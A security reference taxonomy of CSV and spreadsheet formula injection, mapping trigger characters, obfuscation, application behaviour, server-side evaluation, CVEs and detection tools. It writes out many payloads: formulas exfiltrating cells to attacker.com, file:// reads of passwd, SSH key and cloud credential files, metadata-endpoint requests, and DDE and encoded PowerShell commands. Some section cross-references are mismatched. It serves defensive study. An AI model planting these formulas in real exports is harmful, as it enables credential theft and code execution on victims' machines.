# CSV / Formula Injection — Mutation & Variation Taxonomy

---

## Classification Structure

CSV/Formula Injection exploits a fundamental design flaw in spreadsheet file formats: **the absence of separation between data and executable code**. When an application exports user-controlled input into a CSV, TSV, or spreadsheet file (XLSX, ODS) without neutralization, and that file is subsequently opened in a spreadsheet application, any cell beginning with certain trigger characters is interpreted as a formula rather than a literal string. This taxonomy organizes the entire attack surface into seven structural categories based on **what component of the injection chain is being mutated**.

**Axis 1 (Primary — Mutation Target)** structures the document by the specific element being exploited: trigger syntax, exfiltration channel, resource access method, obfuscation technique, application-specific behavior, server-side evaluation context, or document-level structure.

**Axis 2 (Cross-cutting — Interaction Requirement)** classifies each subtype by the degree of victim interaction required:

| Interaction Level | Description | Example |
|---|---|---|
| **Auto-execute** | Fires when the file is opened (may require warning dismissal) | `=WEBSERVICE(...)` in Excel, `=IMPORTXML(...)` in Google Sheets |
| **Click-triggered** | Requires the victim to click a cell, link, or UI element | `=HYPERLINK(...)` exfiltration |
| **Multi-step** | Requires enabling external features (DDE, macros, Trust Center) | DDE command execution |
| **Passive** | Alters display/content without outbound action | Cell content manipulation, phishing text |

**Axis 3 (Mapping — Attack Scenario)** connects techniques to deployment contexts: client-side (victim opens exported file), server-side (application processes uploaded spreadsheet), cloud platform (log poisoning → export chain), and supply chain (library-level vulnerability).

---

## §1. Formula Trigger Primitives

The entry point for all formula injection attacks is a set of characters that spreadsheet applications interpret as the beginning of a formula rather than a data value. Understanding the full set of trigger characters — including lesser-known ones — is essential because sanitization that misses even one trigger renders the entire defense ineffective.

### §1-1. Standard Formula Initiators

These are the characters universally documented as formula triggers across major spreadsheet applications.

| Subtype | Character | Mechanism | Key Condition |
|---|---|---|---|
| **Equals sign** | `=` | Primary formula prefix in all spreadsheet applications; everything after `=` is parsed as an expression | Universal — works in Excel, LibreOffice, Google Sheets, OpenOffice |
| **Plus sign** | `+` | Interpreted as a unary positive operator, causing the remainder to be evaluated as a numeric expression or formula | Excel, LibreOffice; may trigger formula bar evaluation |
| **Minus sign** | `-` | Interpreted as a unary negation operator, triggering expression evaluation | Excel, LibreOffice; same mechanism as `+` |
| **At sign** | `@` | In modern Excel (Office 365), `@` invokes the implicit intersection operator; in legacy versions and other applications, it prefixes certain function calls | Excel-specific behavior varies by version; also triggers in some LibreOffice contexts |

### §1-2. Extended Trigger Characters

These characters are less commonly documented but can initiate formula interpretation under specific conditions. They were added to OWASP's recommended sanitization list and are critical for defense completeness.

| Subtype | Character | Mechanism | Key Condition |
|---|---|---|---|
| **Tab character** | `0x09` | When placed at the start of a cell value inside a quoted CSV field, certain spreadsheet applications strip the tab and evaluate the remaining content as a formula | Application-dependent; particularly relevant when tab is used as a sanitization prefix and then removed on re-save |
| **Carriage return** | `0x0D` | Similar to tab — can be stripped during parsing, exposing the formula trigger character that follows | Application-dependent; added to OWASP guidance alongside tab |
| **Newline in quoted field** | `0x0A` | When a CSV field is quoted and contains a newline, the content after the newline may begin a new logical cell in some parsers, enabling injection in what appears to be a single field | Parser-dependent; exploits differences in RFC 4180 compliance |

### §1-3. Compound Trigger Patterns

Formulas can be initiated through character sequences that individually appear harmless but combine to trigger evaluation.

| Subtype | Pattern | Mechanism | Key Condition |
|---|---|---|---|
| **Arithmetic prefix** | `+1+1+cmd\|'...'!A` | The initial `+1+1` triggers expression evaluation; the chained DDE call executes within the expression context | Requires `+` trigger recognition and DDE enablement |
| **Function-prefixed** | `@SUM(1+1)*cmd\|'...'!A` | `@SUM` initiates function evaluation; the multiplication operator chains to a DDE invocation | Excel with DDE enabled |
| **Quoted field escape** | `"=cmd\|'...'"` | If the application strips surrounding quotes during CSV import but retains the `=` prefix, the formula becomes active | Depends on CSV parser's quote-handling behavior |

---

## §2. Network-Based Data Exfiltration

Data exfiltration formulas extract information from the spreadsheet (or from the victim's system) and transmit it to an attacker-controlled server over network channels. The critical differentiator between subtypes is the **interaction requirement**: some execute automatically on file open, while others require a click.

### §2-1. HYPERLINK-Based Exfiltration (Click-Triggered)

The `HYPERLINK` function creates a clickable link within a cell. When the link URL is dynamically constructed to include data from other cells, clicking it transmits that data to the attacker's server.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Basic cell leak** | `=HYPERLINK("http://attacker.com?d="&A1, "Click Here")` — concatenates the value of cell A1 into the URL query string. When clicked, the browser navigates to the URL, transmitting the cell content. | Requires victim to click the link. No warning prompt in most applications. |
| **Multi-cell exfiltration** | `=HYPERLINK("http://attacker.com?leak="&B2&B3&C2&C3, "Details")` — concatenates multiple cell values, enabling bulk data extraction in a single click. | Same click requirement. Data volume limited by URL length. |
| **Credential harvesting** | The HYPERLINK target URL points to a convincing phishing page styled to match the organization's login portal. The spreadsheet cell displays trusted-looking text (e.g., "View Full Report") while the underlying URL redirects to the attacker. | Social engineering — victim must click and then enter credentials on the phishing page. |

**Key advantage**: HYPERLINK does not trigger Excel's external content warning dialogs. The exfiltration appears as a normal hyperlink click, making it significantly stealthier than DDE-based attacks.

### §2-2. WEBSERVICE-Based Exfiltration (Auto-Execute)

The `WEBSERVICE` function (available in Excel 2013+, Windows only) makes an HTTP GET request to a specified URL and returns the response body as the cell value. Critically, **it executes automatically when the spreadsheet is opened or recalculated**, requiring no click beyond opening the file.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Direct cell leak** | `=WEBSERVICE("http://attacker.com/?d="&A2)` — sends the value of cell A2 as a URL parameter via HTTP GET when the sheet is opened. | Excel 2013+ on Windows. User must dismiss the initial "external content" warning. |
| **Chained request** | `=WEBSERVICE("http://attacker.com/?c="&WEBSERVICE("http://internal-service/api"))` — the inner WEBSERVICE fetches from an internal service, and the outer one exfiltrates the response to the attacker. Effectively a **client-side SSRF**. | Excel 2013+ + internal network access from victim host. Enables reconnaissance of internal APIs. |
| **ENCODEURL processing** | `=WEBSERVICE("http://attacker.com/?d="&ENCODEURL(A1))` — URL-encodes the cell contents to handle special characters that would break the URL structure. | Excel 2013+. Necessary for cells containing spaces, ampersands, or other URL-unsafe characters. |
| **SUBSTITUTE sanitization** | `=WEBSERVICE(CONCAT("http://attacker.com/", SUBSTITUTE(A2, " ", "+")))` — replaces spaces with plus signs to maintain URL validity during exfiltration. | Excel 2013+. Common pattern for cleaning extracted data before transmission. |

**Limitations**: WEBSERVICE only supports HTTP/HTTPS protocols (no `file://`, `smb://`, or other schemes). NULL bytes in data terminate the URL string, preventing binary data exfiltration. Certain ports are blocked.

### §2-3. WEBSERVICE + FILTERXML Chain (Structured Extraction)

`FILTERXML` (Excel 2013+) parses XML using XPath expressions, enabling targeted extraction from XML/HTML responses obtained via WEBSERVICE.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **XPath extraction** | `=FILTERXML(WEBSERVICE("http://target/api.xml"), "//secret/text()")` — fetches an XML document and extracts specific nodes using XPath, allowing precise data targeting from structured API responses. | Excel 2013+. Target must return well-formed XML. |
| **Selective SSRF** | Combines WEBSERVICE to reach internal XML-based services with FILTERXML to extract only the sensitive fields (credentials, tokens, configuration values) from verbose API responses. | Internal service must return XML. Enables surgical data extraction. |

### §2-4. DNS-Based Out-of-Band Exfiltration

When HTTP egress is filtered, DNS queries offer an alternative exfiltration channel since DNS traffic is rarely blocked.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **DNS via WEBSERVICE** | `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<attacker-domain>"))` — constructs a hostname from file content: `MID` extracts character ranges, `ENCODEURL` handles special characters, `SUBSTITUTE` replaces `%` with `-` for DNS compatibility, and the final string becomes a DNS lookup to `<encoded-data>.attacker.com`. | LibreOffice (supports `file://` protocol for local file access). Attacker must control an authoritative DNS server to capture queries. |
| **Segmented extraction** | Multiple formulas in different cells each extract different character ranges (positions 1-41, 42-82, etc.) using `MID`, enabling full file extraction through parallel DNS queries with sequential subdomain labels. | Same as above. Requires multiple cells or iterative extraction. Limited to ~41 characters per DNS label. |

### §2-5. Google Sheets Import Functions (Auto-Execute)

Google Sheets provides a family of `IMPORT*` functions designed for legitimate data aggregation. Each makes outbound requests to specified URLs and can be weaponized for exfiltration by embedding stolen data in the request URL.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **IMPORTXML** | `=IMPORTXML("http://attacker.com/?d="&A1, "//a/@href")` — sends cell data as a URL parameter while requesting an XML/HTML document. The second argument is an XPath expression for the expected response format. | Google Sheets. An authorization prompt warns the user about external resource access, but the request fires upon approval. |
| **IMPORTHTML** | `=IMPORTHTML("http://attacker.com/?d="&A1, "table", 1)` — similar exfiltration vector disguised as an HTML table import. | Google Sheets + user authorization. |
| **IMPORTFEED** | `=IMPORTFEED("http://attacker.com/feed?d="&A1)` — requests an RSS/Atom feed with embedded stolen data. | Google Sheets + user authorization. |
| **IMPORTDATA** | `=IMPORTDATA("http://attacker.com/data?d="&A1)` — retrieves CSV/TSV data from a URL, transmitting cell content in the request. Used for **live-streaming exfiltration**: when cell values change, the formula re-evaluates and sends updated data. | Google Sheets + user authorization. Enables continuous monitoring when the sheet remains open. |
| **IMPORTRANGE** | `=IMPORTRANGE("spreadsheet_url", "Sheet1!A1:D10")` — accesses data from another Google Sheets document. Can be used to exfiltrate data across organizational boundaries if the target spreadsheet is shared. | Requires the target spreadsheet to grant access. Cross-tenant data leakage vector. |
| **IMAGE** | `=IMAGE("http://attacker.com/pixel.png?d="&A1)` — loads an image from a URL constructed with stolen data. The tracking pixel pattern enables silent exfiltration via image request. | Google Sheets. The image request occurs automatically. |

---

## §3. Local Resource Access

Beyond network exfiltration, certain spreadsheet applications allow formulas to read local files or access system information directly, without making outbound network requests.

### §3-1. LibreOffice File Protocol Access

LibreOffice Calc supports the `file://` protocol scheme within cell references, enabling direct reading of local files on the victim's filesystem.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Direct file read** | `='file:///etc/passwd'#$passwd.A1` — reads the first line of `/etc/passwd` by referencing it as an external spreadsheet. The `#$passwd` fragment specifies the sheet name, and `.A1` specifies the cell containing the first line. | LibreOffice Calc on Linux/macOS. The file must be readable by the user running LibreOffice. |
| **Multi-line extraction** | Chain references: `='file:///etc/passwd'#$passwd.A1` in cell B1, `='file:///etc/passwd'#$passwd.A2` in cell B2, etc. Each reference extracts a successive line from the target file. | Same conditions. Requires one formula per line. |
| **Combined read + exfiltrate** | `=WEBSERVICE(CONCATENATE("http://attacker.com/",('file:///etc/passwd'#$passwd.A1)))` — reads a local file line and immediately transmits it to the attacker's server via WEBSERVICE. Combines §3-1 with §2-2 for a single-formula read-and-exfiltrate chain. | LibreOffice Calc with WEBSERVICE support. |
| **Configuration theft** | Target sensitive configuration files: `='file:///home/user/.ssh/id_rsa'#$id_rsa.A1` or `='file:///home/user/.aws/credentials'#$credentials.A1` — extracts SSH private keys or cloud credentials. | LibreOffice Calc. Files must contain line-delimited text data. |

### §3-2. Internal Service Probing via WEBSERVICE

When WEBSERVICE is combined with internal network targets rather than attacker-controlled servers, it becomes a **client-side SSRF** probe.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Metadata endpoint access** | `=WEBSERVICE("http://169.254.169.254/latest/meta-data/")` — when the victim is on an AWS EC2 instance, this reads the instance metadata service, exposing IAM credentials, instance identity, and configuration. | Victim must be on a cloud instance with accessible metadata endpoint. Excel 2013+ or LibreOffice. |
| **Internal API discovery** | `=WEBSERVICE("http://internal-service.corp:8080/api/status")` — probes internal APIs that are accessible from the victim's network but not from the attacker's external position. | Internal network access from victim host. |
| **Port scanning** | Sequential WEBSERVICE calls to `http://target:<port>/` across a range of ports. Successful responses (or timing differences in error responses) reveal open services. | Impractical at scale due to long timeouts, but viable for targeted probing of known internal services. |

---

## §4. Payload Obfuscation & Filter Evasion

Once an injection vector is identified, attackers must evade sanitization filters, WAFs, and antivirus engines that scan for known payload patterns. Obfuscation techniques modify the syntactic appearance of payloads without altering their execution semantics.

### §4-1. Prefix Obfuscation

Arbitrary expressions can be prepended before the malicious command. The spreadsheet engine evaluates the entire expression chain, and the DDE invocation fires regardless of preceding arithmetic.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Arithmetic prefix** | `=AAAA+BBBB-CCCC&"Hello"/12345&cmd\|'/c calc.exe'!A` — the nonsensical arithmetic evaluates harmlessly; the DDE call at the end still executes. Each sub-expression can be up to 255 characters. | DDE enabled. An unlimited number of prefix expressions can be chained. |
| **Function prefix** | `+thespanishinquisition(cmd\|'/c calc.exe'!A` — prefixes the DDE call with a nonexistent function name. The function call fails silently, but the DDE invocation still triggers. | DDE enabled. The function name is arbitrary. |
| **Legitimate formula prefix** | `=1+1+cmd\|'/C calc'!A0` — prepends a valid arithmetic expression so that signature-based filters looking for `=cmd` patterns fail to match. | DDE enabled. Common bypass for naive string-matching filters. |

### §4-2. Infix Obfuscation

Characters inserted within the payload body that are stripped during execution.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Null byte injection** | `=C\x00m\x00D\|'/c calc'!A` — null bytes (`0x00`) interspersed within the command name are ignored by the expression parser. "An expression can have an unlimited amount of null bytes interspersed within it." | DDE enabled. Null bytes must survive the CSV parser (encoding-dependent). |
| **Whitespace injection** | `=    C    m D \|'/c calc.exe'!A` — spaces inserted between characters of the command name. Spaces are ignored in certain positions (before the command, between arguments) but split the command if placed within the executable name in some contexts. | DDE enabled. Less reliable than null bytes; behavior varies by parser. |
| **Case randomization** | `=CmD\|'/c calc'!A`, `=CMD\|'/c calc'!A`, `=cMd\|'/c calc'!A` — command names are case-insensitive on Windows, allowing arbitrary case variations to evade case-sensitive signature matching. | DDE enabled on Windows. Trivial bypass for case-sensitive pattern matching. |

### §4-3. Encoding-Level Bypass

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Base64-encoded PowerShell** | `=cmd\|'/C powershell IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("...")))'!A0` — the actual malicious command is Base64-encoded within the PowerShell invocation, bypassing content-based filters that scan for keywords like `Invoke-WebRequest` or `DownloadString`. | DDE enabled + PowerShell. Encoded payload avoids string-matching detection. |
| **UTF-7 encoding bypass** | In server-side scenarios, XXE payloads can be UTF-7 encoded to bypass XML encoding validation that only checks for UTF-8/UTF-16 signatures (see §6-2). The regex checking for encoding attribute can be defeated by adding whitespace around the `=` character. | Server-side XLSX processing with PhpSpreadsheet or similar libraries. |

### §4-4. Sanitization-Specific Bypasses

These target specific defense implementations rather than generic detection.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Apostrophe removal on re-save** | When a CSV is opened in Excel, the leading apostrophe (`'`) used as a sanitization prefix may be stripped if the user saves the file and re-opens it. The previously-escaped formula becomes active on the second open. | User must save and re-open the file. Undermines the most commonly recommended mitigation. |
| **Tab prefix stripping** | Similar to apostrophe: the tab character (`0x09`) used as a sanitization prefix may be consumed or ignored by certain spreadsheet applications, re-exposing the formula trigger. | Application-dependent tab handling. |
| **Quote-stripping parsers** | If the CSV parser strips surrounding double quotes from fields (per RFC 4180), a field like `"=cmd\|..."` may have its quotes removed, exposing the formula trigger. | Depends on the specific CSV parser implementation. |
| **Prepend bypass** | MIT research found that code validation techniques checking if a formula contains a valid math function before executing it can be bypassed by prepending the attack string with a legitimate math formula (e.g., `=1+1+<malicious-DDE>`). | Targets validation-based defenses rather than prefix-based sanitization. |

---

## §5. Application-Specific Attack Surfaces

Different spreadsheet applications support different formula functions, have different security models, and present different attack surfaces. This section maps the exploitability matrix across major applications.

### §5-1. Microsoft Excel (Windows)

The most feature-rich and most targeted application. Attack surface includes DDE, WEBSERVICE, FILTERXML, HYPERLINK, and external data connections.

| Feature | Attack Relevance | Version Notes |
|---|---|---|
| **DDE** | Full OS command execution (§2-1) | Disabled by default since December 2017 security updates (KB4053440 for Word, February 2018 for Excel) across Office 2007–2016. Office 2019/2021/365 ship with DDE disabled. Older unpatched installations remain vulnerable. |
| **WEBSERVICE** | Auto-execute HTTP requests, client-side SSRF (§2-2) | Available since Excel 2013. Windows only. |
| **FILTERXML** | Structured XML extraction from WEBSERVICE responses (§2-3) | Available since Excel 2013. Windows only. |
| **HYPERLINK** | Click-triggered data exfiltration (§2-1) | All versions. No security prompt. |
| **ENCODEURL** | URL encoding for exfiltration payloads (§2-2) | Available since Excel 2013. |
| **Power Query** | External data connections that fetch remote data on open | Can be configured to auto-refresh. Enterprise environments may have this enabled. |
| **MSHTML engine** | ActiveX controls rendered within Office documents (CVE-2021-40444) | Exploitable for RCE through crafted documents. Patched but relevant for understanding attack surface. |

### §5-2. LibreOffice Calc

Supports file protocol access and WEBSERVICE, making it the most dangerous application for local file exfiltration chains.

| Feature | Attack Relevance | Notes |
|---|---|---|
| **file:// protocol** | Direct local file reading (§3-1) | Unique to LibreOffice. Enables `/etc/passwd`, SSH keys, cloud credential extraction. |
| **WEBSERVICE** | HTTP exfiltration (§2-2) | Available in LibreOffice. Combines with file:// for read-and-exfiltrate chains. |
| **DDE** | Command execution | Supported as a legacy IPC protocol on Windows. |
| **Macro execution** | VBA-compatible macros in ODS/XLSX files | Requires user enablement. |

### §5-3. Google Sheets

No DDE or local file access, but the `IMPORT*` function family provides powerful auto-executing network exfiltration capabilities.

| Feature | Attack Relevance | Notes |
|---|---|---|
| **IMPORTXML** | OOB data exfiltration (§2-5) | Authorization prompt displayed but request fires on approval. |
| **IMPORTHTML** | OOB exfiltration disguised as HTML import (§2-5) | Same authorization prompt. |
| **IMPORTFEED** | OOB exfiltration via RSS/Atom request (§2-5) | Same authorization prompt. |
| **IMPORTDATA** | Live-streaming exfiltration (§2-5) | Re-evaluates on cell changes, enabling continuous data monitoring. |
| **IMPORTRANGE** | Cross-spreadsheet data access (§2-5) | Requires target spreadsheet sharing permission. |
| **IMAGE** | Silent tracking pixel exfiltration (§2-5) | Image load occurs automatically. |
| **CSV import bypass** | Google Sheets' sanitization (apostrophe prefix) applied to Google Forms responses is **not** applied when importing CSV files directly, leaving formulas active. | Inconsistent sanitization between input channels. |

---

## §6. Server-Side Spreadsheet Injection (SSSI)

A distinct and increasingly important attack class where **the server — not the user — evaluates injected formulas**. This inverts the traditional threat model: instead of targeting a human victim who opens a file, the attacker targets automated server-side processing of spreadsheet uploads.

### §6-1. Server-Side Formula Evaluation

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **PDF/Image conversion** | Web applications that accept uploaded CSV/XLSX files and convert them to PDF or image format (for preview, printing, or archival) often use headless instances of LibreOffice or Excel to perform the conversion. During rendering, formulas are evaluated, and any WEBSERVICE/DDE calls execute on the server. | Application uses LibreOffice/Excel as a conversion engine. |
| **Report generation** | Applications that import spreadsheet data to generate reports may evaluate formulas to compute derived values. If user-controlled cells contain injected formulas, they execute in the server's context with server-level network access and file permissions. | Application evaluates formulas rather than treating all imports as literal text. |
| **Real-time evaluation** | G-Suite integrated applications that export user data to Google Sheets may trigger formula re-evaluation whenever the sheet is accessed by an administrator. Injected `IMPORTDATA` formulas provide continuous streaming of updated data to the attacker. | G-Suite/Google Sheets integration with auto-refresh. |
| **Cloud metadata via SSSI** | When server-side conversion runs on a cloud instance (EC2, GCE, Azure VM), injected formulas can access instance metadata endpoints (`http://169.254.169.254/...`), exfiltrating IAM credentials, instance identity documents, and environment variables. Post-exploitation of stolen cloud credentials can escalate to full infrastructure compromise. | Server runs on a cloud instance with accessible metadata service. |

### §6-2. XML External Entity (XXE) via Spreadsheet Libraries

XLSX files are ZIP archives containing XML documents. Server-side libraries that parse XLSX files may be vulnerable to XXE injection through malicious XML content embedded within the spreadsheet.

| Subtype | Library | Mechanism | CVE |
|---|---|---|---|
| **PhpSpreadsheet XXE** | PhpSpreadsheet (PHP) | The XLSX reader parses XML content without disabling external entity resolution. A crafted XLSX containing a DOCTYPE declaration with external entity references can read server-side files or trigger SSRF. | CVE-2024-45293, CVE-2018-19277 |
| **Encoding bypass** | PhpSpreadsheet (PHP) | The XML scanner's encoding detection regex can be bypassed by inserting whitespace around the `=` in the `encoding` attribute, allowing UTF-7 encoded XXE payloads to evade the security check. | CVE-2024-45293 |
| **openpyxl XXE** | openpyxl (Python) | XML parser processes external entities in uploaded XLSX files, enabling file read and SSRF from the server. | CVE-2017-5992 |
| **General pattern** | Any library parsing XLSX/ODS XML without disabling DTD processing | The fundamental vulnerability is that XLSX is XML-based, and default XML parser configurations in many languages enable external entity resolution. | — |

### §6-3. Server-Side Injection via Log Files

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Cloud log poisoning** | Attacker injects formula payloads into log-generating fields (User-Agent headers, login usernames, API parameters). When an administrator exports these logs to CSV for analysis and opens them in a spreadsheet application, the injected formulas execute. This was demonstrated against Azure logs where no authentication was needed — only knowledge of a valid username. | The application logs user-controlled input. Administrator exports and opens logs in a spreadsheet. |
| **Audit trail injection** | Similar pattern in application audit logs, transaction records, or support ticket exports where user-provided text is included verbatim in CSV exports. | Application includes user input in exportable log/audit data without sanitization. |
| **Financial messaging field injection** | Core banking systems using comma-delimited message formats (e.g., Temenos T24 OFS messages) accept user-controlled input into transaction fields. OFS messages structure fields as comma-separated `FIELD.NAME:POSITION=VALUE` pairs; injecting delimiter characters or additional field assignments into a value overwrites downstream fields — altering transaction amounts, beneficiary accounts, or approval flags within the same message. The attack surface extends to any financial middleware that constructs delimited messages from partially user-controlled data without field-level escaping. | Application constructs structured financial messages (OFS, ISO 8583 field assembly, SWIFT MT field concatenation) from user input without delimiter neutralization. |

---

## §7. Delivery Format & Parser Exploitation

The file format used to deliver the injected payload affects which techniques are available, how parsing occurs, and what sanitization is applied.

### §7-1. CSV (Comma-Separated Values)

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Unquoted injection** | `malicious_name,=cmd\|'/C calc'!A0,other_data` — the formula appears as a bare field value in the CSV. Most spreadsheet applications interpret the `=` prefix directly. | Simplest case. No quoting or escaping to overcome. |
| **Quoted field injection** | `"normal","=cmd\|'/C calc'!A0","data"` — the formula is within a quoted CSV field. The spreadsheet application strips the quotes and evaluates the formula. | RFC 4180-compliant parsers strip quotes and pass content directly. |
| **Field separator confusion** | Injecting commas or semicolons within a quoted field to manipulate column alignment, causing the formula to appear in a different column than expected by sanitization logic. | Affects applications that sanitize specific columns (e.g., "only sanitize the name column") rather than all fields. |
| **Multi-line field injection** | `"normal\n=cmd\|'/C calc'!A0"` — a newline within a quoted CSV field creates a new row in the spreadsheet, where the formula begins on a fresh line with a trigger character. | Parser must support multi-line quoted fields per RFC 4180. |

### §7-2. TSV (Tab-Separated Values)

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Tab as sanitization conflict** | When tab (`0x09`) is used as both the field delimiter (TSV) and the sanitization prefix, the defense mechanism conflicts with the format structure. | Applications that export TSV and use tab-prefix sanitization simultaneously. |

### §7-3. XLSX / ODS (XML-Based Spreadsheet Formats)

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Formula in cell XML** | XLSX stores cell contents in XML. A formula injected into a cell value may be stored as a `<f>` (formula) element rather than a `<v>` (value) element, depending on how the export library handles the content. | Export library must generate proper XLSX structure. Some libraries escape formulas; others do not. |
| **External reference injection** | XLSX supports external references (links to other workbooks). Injected content can create references that trigger network requests when the file is opened. | Excel attempts to resolve external references on open, potentially with a warning. |
| **Shared string table manipulation** | XLSX uses a shared string table for repeated values. Injection into this table can affect multiple cells simultaneously from a single injection point. | Exploits the optimization structure of XLSX format. |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories | Interaction |
|---|---|---|---|
| **Client-side RCE** | User opens exported CSV/XLSX in Excel/LibreOffice on Windows | §1 + §2-1 (DDE) + §4 (obfuscation) | Multi-step (DDE warnings) |
| **Client-side data theft** | User opens exported file; formulas auto-exfiltrate | §1 + §2-2 (WEBSERVICE) or §2-5 (IMPORT*) | Auto-execute or click |
| **Client-side SSRF** | Victim on internal network; WEBSERVICE probes internal services | §1 + §2-2 + §3-2 | Auto-execute |
| **Client-side file read** | Victim opens CSV in LibreOffice; local files extracted | §1 + §3-1 + §2-4 (DNS exfil) | Auto-execute |
| **Server-side RCE** | Application processes uploaded XLSX server-side | §6-1 + §2-1 (if DDE enabled on server) | None (automated) |
| **Server-side XXE** | XLSX upload parsed by vulnerable library | §6-2 | None (automated) |
| **Server-side SSRF** | Server evaluates WEBSERVICE formula during conversion | §6-1 + §2-2 + §3-2 (metadata) | None (automated) |
| **Cloud credential theft** | SSSI on cloud instance → metadata → IAM credentials | §6-1 + §3-2 | None (automated) |
| **Log poisoning chain** | Attacker poisons logs → admin exports CSV → formula fires | §6-3 + §1 + §2/§2 | Indirect (admin opens export) |
| **Cross-tenant data leak** | Google Sheets IMPORTRANGE across organizational boundaries | §2-5 (IMPORTRANGE) | Authorization prompt |
| **Phishing via spreadsheet** | HYPERLINK formula disguised as legitimate link | §2-1 + social engineering | Click |
| **Supply chain** | Vulnerable CSV library ships without sanitization | §6-2, §7-3 | Depends on consumer |
| **Financial transaction manipulation** | Delimiter injection in financial messaging fields alters transaction parameters | §6-3 (Financial messaging) | None (server-side) |

---

## CVE / Bounty Mapping (2023–2025)

| Mutation Combination | CVE / Case | Product | Impact |
|---|---|---|---|
| §1-1 + §2-1 (DDE RCE chain) | CVE-2025-12249 | Axosoft Scrum & Bug Tracking v22.1.1.11545 | RCE via unsanitized Title field in CSV export → DDE execution |
| §1-1 + §2-1 (DDE RCE chain) | CVE-2025-11279 | Axosoft (Part 1: CSV Injection) | CSV injection in Edit Ticket functionality; paired with CVE-2025-12249 for full RCE |
| §1-1 + basic formula | CVE-2025-55745 | UnoPim (Quick Export) | Formula injection in quick export feature; reverse shell demonstrated |
| §1-1 + basic formula | CVE-2025-62417 | Bagisto (Create New Product) | CSV formula injection due to lack of input validation on product attributes |
| §1-1 + §2-1 | CVE-2024-24337 | Koha Library Management v23.05.05 | DDE injection via Budget and Patrons Member CSV exports |
| §1-1 + basic formula | CVE-2024-28111 | (Application) | Formula injection in CSV export |
| §1-1 + §2 (exfiltration) | CVE-2024-29381 | Medplum | CSV/formula injection enabling data exfiltration when admin exports |
| §6-2 (XXE) | CVE-2024-45293 | PhpSpreadsheet (XLSX reader) | XXE via encoding bypass in XML scanner; server-side file read & SSRF |
| §6-2 (XXE) | CVE-2024-45084 | IBM Cognos Controller 11.0.0–11.1.0 | Formula injection (CWE-1236) in enterprise reporting platform |
| §1-1 + basic formula | CVE-2025-13133 | WordPress Simple User Import Export ≤1.1.7 | Formula injection in user import/export plugin |
| §6-2 (XXE) | CVE-2018-19277 | PhpSpreadsheet | XXE injection in XLSX parsing |
| §6-2 (XXE) | CVE-2017-5992 | openpyxl (Python) | XXE in XLSX parsing |
| §6-3 (Log poisoning) | — (Vectra research) | Microsoft Azure Logs | Formula injection via sign-in log poisoning; no authentication required |
| §6-1 (SSSI) | — (Bishop Fox) | G-Suite integrated application | Live-streaming data exfiltration + DDE-based RCE on cloud instance |
| §2-1 + §2-2 | HackerOne #1748961 | Consensys (MetaMask) | CSV injection in export functionality |
| §2-2 (WEBSERVICE SSRF) | — (Bug bounty writeup) | Undisclosed | CSV injection → client-side SSRF → AWS IAM credential exfiltration |
| §6-3 (Financial messaging) | — (Omar El Shopky, 2025) | Temenos T24 (OFS) | Field delimiter injection in OFS messages overwrites transaction fields; generalizable to financial middleware using delimited message formats |

---

## Detection Tools

| Tool | Type | Target Scope | Core Technique |
|---|---|---|---|
| **CSVScan** | Static analysis (SAST) | Java applications using CSV libraries | Taint analysis tracking user-controlled input to CSV export sinks; identifies formula injection patterns in source code (USENIX WOOT 2025) |
| **OWASP ZAP** | DAST scanner | Web application CSV export endpoints | Injects formula trigger characters into form fields and checks if they appear unsanitized in CSV exports |
| **Burp Suite** | DAST scanner / proxy | Web application export features | Manual and automated testing of CSV/XLSX export endpoints for formula injection; passive scanning for trigger characters in responses |
| **Veracode** | SAST | Application source code | Identifies CWE-1236 patterns in code that generates CSV output |
| **Checkmarx** | SAST | Application source code | Static analysis for unsanitized user input in CSV generation code |
| **Fortify** | SAST | Application source code | Detects formula injection sinks in multiple languages |
| **csv-injection-payloads** (payloadbox) | Payload collection | Manual testing | Curated payload list for testing CSV injection across applications |
| **PayloadsAllTheThings** (swisskyrepo) | Payload collection / reference | Manual testing | Comprehensive payload repository including DDE, obfuscation, and exfiltration payloads |
| **CSV Injection Browser Extension** (MIT thesis) | Client-side defense | Browser-based CSV downloads | Browser extension that sanitizes formula triggers in downloaded CSV files before they reach the spreadsheet application |
| **Cynet** | Endpoint protection | DDE execution | Behavioral detection of DDE-initiated command execution from spreadsheet applications |

---

## Summary: Core Principles

**The fundamental property** that makes CSV/Formula Injection possible is the CSV format's complete absence of a data-code boundary. Unlike programming languages that distinguish between string literals and executable code through syntax (quotes, keywords, type annotations), CSV treats every cell value as potentially executable based solely on its first character. A single `=` prefix transforms inert data into an active formula with access to network functions, file protocols, and — through DDE — the full operating system command surface. This is not a bug in any specific implementation; it is an architectural property of the data-is-code design inherited from early spreadsheet applications where every cell was expected to contain either a literal value or a formula.

**Incremental patches fail** because the defense burden is fragmented across the entire stack. Web applications must sanitize on export, but the set of trigger characters has expanded over time (tab, carriage return were only recently added to guidance). Prefix-based sanitization (apostrophe, tab) is defeated by the spreadsheet application's own save-and-reopen behavior, which may strip the prefix. DDE has been disabled by default in modern Excel, but WEBSERVICE — which enables auto-executing SSRF and data exfiltration — remains fully functional. Google Sheets blocks DDE but provides `IMPORT*` functions with equivalent exfiltration power. LibreOffice allows `file://` protocol access that neither Excel nor Google Sheets permit. Each application patches its own most egregious vector while leaving others open, and the lack of built-in sanitization in CSV parsing libraries (confirmed by WOOT 2025 research analyzing four libraries) means that every application developer must independently rediscover and implement defense logic.

